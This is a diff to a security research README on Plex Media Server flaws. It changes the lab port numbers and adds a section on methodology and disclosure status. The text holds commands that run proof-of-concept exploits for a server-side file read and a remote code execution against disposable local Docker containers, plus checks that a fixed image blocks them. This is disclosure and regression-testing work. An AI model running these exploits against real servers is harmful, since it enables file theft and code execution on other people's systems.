@@ -59,7 +59,7 @@ ffmpeg -y -f lavfi -i testsrc=size=640x360:rate=24 \
   -c:v libx264 -pix_fmt yuv420p -c:a aac \
   "$PWD/artifacts/media/test.mp4"
 docker run -d --name plex-10861 \
-  -p 127.0.0.1:32400:32400 \
+  -p 127.0.0.1:32401:32400 \
   -v "$PWD/artifacts/plex-config:/config" \
   -v "$PWD/artifacts/media:/data" \
   plexinc/pms-docker@sha256:dd9bcf6494a1f7e817710e75d2ff66beb68485b5ea1b63c7c712adc25983b9bb
@@ -78,7 +78,7 @@ Run the file-read PoC:
 
 ```bash
 python3 metadata-file-read/poc.py \
-  --url http://127.0.0.1:32400 \
+  --url http://127.0.0.1:32401 \
   --rating-key 1 \
   --token TOKEN \
   --file /etc/hostname
@@ -89,7 +89,7 @@ the disposable container to trigger Plex Script Host:
 
 ```bash
 python3 profile-extra-rce/poc.py \
-  --url http://127.0.0.1:32400 \
+  --url http://127.0.0.1:32401 \
   --rating-key 1 \
   --token TOKEN \
   --command 'touch /config/PROFILE_RCE_MARKER' \
@@ -104,14 +104,14 @@ and the fixed amd64 image:
 mkdir -p "$PWD/artifacts/fixed-config" "$PWD/artifacts/fixed-media"
 cp "$PWD/artifacts/media/test.mp4" "$PWD/artifacts/fixed-media/test.mp4"
 docker run -d --name plex-10896 \
-  -p 127.0.0.1:32401:32400 \
+  -p 127.0.0.1:32402:32400 \
   -v "$PWD/artifacts/fixed-config:/config" \
   -v "$PWD/artifacts/fixed-media:/data" \
   plexinc/pms-docker@sha256:c708587e4874617961a1bc24db9cffa2413653ff422f1b05dfec013339e6824d
 ```
 
 Add the test video as a new library, obtain that server's token and rating key,
-and run both PoCs against `http://127.0.0.1:32401`. The file-read request must
+and run both PoCs against `http://127.0.0.1:32402`. The file-read request must
 not return the selected server-side file. The RCE PoC must fail to find its
 per-run `.pth` payload.
 
@@ -132,6 +132,18 @@ Token scope for the authenticated findings was tested with local-administrator
 tokens. Managed and shared-user tokens were not tested, and no claim is made
 about those token classes. The unauthenticated findings were tested from the
 local Docker network against unclaimed lab servers; WAN behavior was not tested.
+
+## Methodology and disclosure status
+
+Findings were derived from static comparison of official packages and dynamic
+regression testing at the build boundaries recorded in [TESTING.md](TESTING.md).
+Binary strings were extracted with printable-string scanning and correlated
+with changed behavior; package hashes identify the reviewed inputs.
+
+Unless a Plex advisory or CVE is linked for a specific finding, classifications
+and impact statements are researcher assessments, not vendor confirmation.
+Research credit: Zenofex. CVSS scores are omitted because final CVE scope and
+deployment assumptions were not available at publication time.
 
 ## References
 
